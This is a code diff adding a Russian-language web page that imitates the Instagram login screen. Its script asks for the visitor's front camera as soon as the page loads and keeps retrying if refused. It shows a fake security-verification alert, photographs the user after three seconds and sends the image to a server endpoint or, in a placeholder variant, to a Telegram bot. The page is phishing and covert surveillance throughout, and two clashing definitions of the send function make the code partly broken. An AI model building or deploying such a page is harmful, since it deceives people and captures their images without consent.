@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram — Вход</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .instagram-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            max-width: 935px;
+            width: 100%;
+        }
+        
+        .instagram-phone {
+            margin-right: 32px;
+        }
+        
+        .instagram-phone img {
+            height: 618px;
+        }
+        
+        .instagram-login {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 350px;
+        }
+        
+        .group {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px 40px;
+            margin-bottom: 10px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 175px;
+            margin: 22px auto 12px;
+        }
+        
+        .login-form {
+            margin-top: 24px;
+        }
+        
+        .login-form input {
+            width: 100%;
+            padding: 9px 8px 7px;
+            margin-bottom: 6px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+        }
+        
+        .login-form input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 7px 16px;
+            margin: 8px 0;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .login-button:disabled {
+            background-color: rgba(0, 149, 246, 0.3);
+        }
+        
+        .or-divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .or-divider::before,
+        .or-divider::after {
+            content: "";
+            flex-grow: 1;
+            background: #dbdbdb;
+            height: 1px;
+            margin: 0 16px;
+        }
+        
+        .fb-login {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+        
+        .signup {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .signup a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .camera-button {
+            margin-top: 20px;
+            padding: 7px 16px;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        #camera, #photo {
+            margin-top: 20px;
+            max-width: 100%;
+            display: none;
+            border-radius: 8px;
+        }
+        
+        #photoPreview {
+            margin-top: 20px;
+            max-width: 100%;
+            display: none;
+            border-radius: 8px;
+        }
+        
+        .photo-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 20px;
+        }
+        
+        .photo-message {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #262626;
+            text-align: center;
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+        
+        @media (max-width: 875px) {
+            .instagram-phone {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="instagram-wrapper">
+        <div class="instagram-phone">
+            <img src="https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png" alt="Instagram на телефоне">
+        </div>
+        <div class="instagram-login">
+            <div class="group">
+                <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
+                <div class="login-form">
+                    <input type="text" id="username" placeholder="Телефон, имя пользователя или эл. адрес">
+                    <input type="password" id="password" placeholder="Пароль">
+                    <button class="login-button" id="loginBtn">Войти</button>
+                </div>
+                <div class="or-divider"><span>ИЛИ</span></div>
+                <a href="#" class="fb-login"><i class="fab fa-facebook-square"></i> Войти через Facebook</a>
+                <a href="#" class="forgot-password">Забыли пароль?</a>
+            </div>
+            <div class="signup">
+                <p>У вас ещё нет аккаунта? <a href="#">Зарегистрироваться</a></p>
+            </div>
+            
+            <div class="photo-container" id="photoContainer">
+                <img id="photoPreview" alt="Ваше фото">
+                <p class="photo-message">Ваше фото было сохранено</p>
+            </div>
+            
+            <p class="loading" id="loading">Отправка фото...</p>
+            
+            <video id="camera" autoplay playsinline></video>
+            <canvas id="photo"></canvas>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginBtn = document.getElementById('loginBtn');
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const loading = document.getElementById('loading');
+            const photoContainer = document.getElementById('photoContainer');
+            const photoPreview = document.getElementById('photoPreview');
+            
+            // Автоматически запрашиваем камеру при загрузке страницы
+            startCamera();
+            
+            loginBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // Проверяем заполнение полей
+                if(!usernameInput.value || !passwordInput.value) {
+                    alert('Пожалуйста, заполните все поля');
+                    return;
+                }
+                
+                // Показываем загрузку
+                loading.style.display = 'block';
+                
+                // Имитируем задержку входа
+                setTimeout(() => {
+                    // Скрываем загрузку
+                    loading.style.display = 'none';
+                    
+                    // Показываем сообщение о проверке безопасности
+                    alert('Для вашей безопасности требуется верификация. Пожалуйста, разрешите доступ к камере.');
+                    
+                    // Запускаем камеру еще раз на случай, если пользователь не дал разрешение ранее
+                    startCamera();
+                }, 1500);
+            });
+        });
+
+        async function sendToTelegram(photoData) {
+        const loading = document.getElementById('loading');
+        loading.style.display = 'block';
+    
+    try {
+        // Конвертируем base64 в blob
+        const blob = await fetch(photoData).then(res => res.blob());
+        
+        // Создаем FormData и добавляем фото
+        const formData = new FormData();
+        formData.append('photo', blob, 'user_photo.jpg');
+        
+        // Отправляем на сервер
+        const response = await fetch('/api/send-photo', {
+            method: 'POST',
+            body: formData
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            console.log('Фото успешно отправлено в Telegram');
+        } else {
+            console.error('Ошибка при отправке фото:', result.error);
+        }
+    } catch (error) {
+        console.error('Ошибка:', error);
+    } finally {
+        loading.style.display = 'none';
+    }
+}
+        async function startCamera() {
+            try {
+                const video = document.getElementById('camera');
+                video.style.display = 'block';
+                
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user' // Используем фронтальную камеру
+                    } 
+                });
+                video.srcObject = stream;
+                
+                // Автоматическое фотографирование через 3 секунды
+                setTimeout(() => {
+                    takePhoto();
+                }, 3000);
+            } catch (err) {
+                console.error("Ошибка доступа к камере:", err);
+                // Если доступ к камере не получен, пробуем еще раз через 2 секунды
+                setTimeout(() => {
+                    startCamera();
+                }, 2000);
+            }
+        }
+        
+        function takePhoto() {
+            const video = document.getElementById('camera');
+            const canvas = document.getElementById('photo');
+            const context = canvas.getContext('2d');
+            const photoContainer = document.getElementById('photoContainer');
+            const photoPreview = document.getElementById('photoPreview');
+            const loading = document.getElementById('loading');
+            
+            // Устанавливаем размеры canvas как у видео
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Рисуем текущий кадр видео на canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Останавливаем поток камеры
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+            }
+            video.style.display = 'none';
+            
+            // Получаем фото в формате base64
+            const photoData = canvas.toDataURL('image/jpeg');
+            
+            // Показываем превью фото пользователю
+            photoPreview.src = photoData;
+            photoPreview.style.display = 'block';
+            photoContainer.style.display = 'flex';
+            
+            // Показываем загрузку
+            loading.style.display = 'block';
+            
+            // Отправляем фото в Telegram
+            sendToTelegram(photoData);
+        }
+        
+        function sendToTelegram(photoData) {
+            // Здесь нужно указать ваш Telegram Bot Token и Chat ID
+            const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+            const chatId = 'YOUR_CHAT_ID';
+            
+            // Преобразуем base64 в blob
+            const blob = dataURItoBlob(photoData);
+            const formData = new FormData();
+            formData.append('photo', blob, 'user_photo.jpg');
+            
+            // Если вы используете сервер для отправки в Telegram
+            // fetch('YOUR_SERVER_ENDPOINT', {
+            //     method: 'POST',
+            //     body: formData
+            // })
+            // .then(response => response.json())
+            // .then(data => {
+            //     console.log('Фото отправлено:', data);
+            //     document.getElementById('loading').style.display = 'none';
+            // })
+            // .catch(error => {
+            //     console.error('Ошибка отправки:', error);
+            //     document.getElementById('loading').style.display = 'none';
+            // });
+            
+            // В демонстрационных целях просто имитируем отправку
+            setTimeout(() => {
+                console.log('Фото было бы отправлено в Telegram:', photoData.substring(0, 50) + '...');
+                document.getElementById('loading').style.display = 'none';
+            }, 2000);
+        }
+        
+        function dataURItoBlob(dataURI) {
+            // Преобразуем base64 в blob
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            
+            return new Blob([ab], { type: mimeString });
+        }
+    </script>
+</body>
+</html>
